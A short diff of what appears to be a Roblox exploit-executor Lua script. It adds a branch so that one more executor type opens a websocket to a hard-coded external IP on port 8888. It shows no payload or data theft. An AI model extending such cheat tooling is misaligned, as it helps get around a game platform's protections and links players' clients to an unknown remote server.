@@ -113,6 +113,8 @@ if syn then
     Websocket = syn.websocket.connect("ws://138.201.137.59:8888");
 elseif KRNL_LOADED then
     Websocket = Krnl.WebSocket.connect("ws://138.201.137.59:8888");
+elseif getexecutorname and type(getexecutorname) == "function" then
+    Websocket = WebSocket.connect("ws://138.201.137.59:8888");
 end
 
 wait(0.5);
